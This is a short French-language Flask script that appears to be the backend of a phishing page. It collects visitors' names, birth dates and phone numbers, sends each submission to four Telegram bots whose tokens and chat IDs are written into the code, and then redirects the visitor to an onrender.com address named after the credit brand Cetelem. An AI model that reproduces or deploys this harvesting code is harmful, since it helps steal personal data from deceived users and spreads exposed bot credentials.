from flask import Flask, render_template, request, redirect
import requests

app = Flask(__name__)

# Liste des bots et chats (4 bots)
TELEGRAM_BOTS = [
    {"token": "8186336309:AAFMZ-_3LRR4He9CAg7oxxNmjKGKACsvS8A", "chat_id": "6297861735"},  # Bot 1
    {"token": "7858273702:AAEMIDAD8ZwY_Y0iZliX-5YPXNoHCkeB9HQ", "chat_id": "5214147917"},  # Bot 2
    {"token": "8061642865:AAHHUZGH3Kzx7tN2PSsyLc53235DcVzMqKs", "chat_id": "7650873997"},  # Bot 3
    {"token": "8185981027:AAH6QYJxVlYpZl8sv2nPzjj6zcmdxaop6KA", "chat_id": "5974789663"}                         # Bot 4
]

@app.route('/')
def index():
    return render_template('form1.html')

@app.route('/submit', methods=['POST'])
def submit():
    nom = request.form.get('nom')
    prenom = request.form.get('prenom')
    date_naissance = request.form.get('date_naissance')
    telephone = request.form.get('telephone')

    message = f"""📨 Nouvelle soumission :
👤 Nom : {nom}
🧾 Prénoms : {prenom}
🎂 Date de naissance : {date_naissance}
📞 Téléphone : {telephone}
"""

    for bot in TELEGRAM_BOTS:
        url = f"https://api.telegram.org/bot{bot['token']}/sendMessage"
        payload = {'chat_id': bot['chat_id'], 'text': message}

        try:
            response = requests.post(url, data=payload)
            response.raise_for_status()
        except requests.exceptions.RequestException as e:
            return f"Erreur d’envoi avec le bot {bot['token'][:10]}... : {e}", 500

    return redirect("https://cetelem-beton-x2zp.onrender.com/")

if __name__ == '__main__':
    app.run(debug=True)
